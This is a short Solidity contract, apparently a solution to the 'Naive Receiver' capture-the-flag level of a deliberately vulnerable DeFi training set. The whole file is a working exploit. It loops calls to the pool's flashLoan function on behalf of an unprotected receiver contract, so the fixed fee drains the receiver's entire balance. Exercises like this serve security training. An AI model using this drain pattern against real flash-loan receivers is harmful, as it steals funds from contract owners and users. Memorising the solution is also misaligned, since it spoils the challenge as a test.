// SPDX-License-Identifier: MIT

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

pragma solidity ^0.8.0;

contract NaiveReceiverExploit {
    function exploit(
        address payable _pool,
        address payable _receiver
    ) external {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        FlashLoanReceiver receiver = FlashLoanReceiver(_receiver);

        uint256 fee = pool.fixedFee();
        uint256 fundsToDrain = address(receiver).balance;

        for (uint256 i = 0; i < fundsToDrain / fee; ++i) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}
